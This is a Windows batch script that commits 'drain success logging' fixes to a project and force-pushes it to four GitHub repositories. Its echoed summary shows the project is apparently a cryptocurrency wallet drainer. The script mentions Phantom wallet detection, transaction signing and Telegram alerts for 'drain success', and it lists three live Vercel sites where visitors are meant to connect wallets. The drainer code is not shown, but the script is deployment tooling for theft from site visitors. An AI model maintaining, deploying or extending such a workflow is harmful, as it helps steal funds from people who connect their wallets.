@echo off
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo Checking if this is a git repository...
if not exist ".git" (
    echo ERROR: Not in a git repository!
    echo Please run this script from the Emi-lokan-main directory.
    pause
    exit /b 1
)
echo Git repository found!
echo.
echo Fixing drain success logging...
echo.
echo Changes made:
echo - Improved transaction status checking logic
echo - Added support for 'processed' and 'broadcast_success' statuses
echo - Added fallback success logging when status check fails
echo - Enhanced error handling and debugging logs
echo.
echo Committing drain success logging fixes...
git add .
git commit -m "FIX: Drain success logging - improved status checking and fallback success detection"
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing fixes to all repositories...
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo Done! Drain success logging fixes pushed to all repositories.
echo.
echo Summary:
echo - Wallet detection is working (Phantom detected correctly)
echo - Transaction signing and broadcasting is working
echo - Status checking improved with fallback success detection
echo - Drain success logging should now work for all successful transactions
echo.
echo Test sites:
echo - MISUSE: https://misuse.vercel.app
echo - XENA: https://xena-brown.vercel.app
echo - Mambo: https://mambo-azure.vercel.app
echo.
echo Next test:
echo 1. Visit any site and connect a wallet
echo 2. Complete a transaction
echo 3. Check Telegram for both wallet detection AND drain success messages
pause
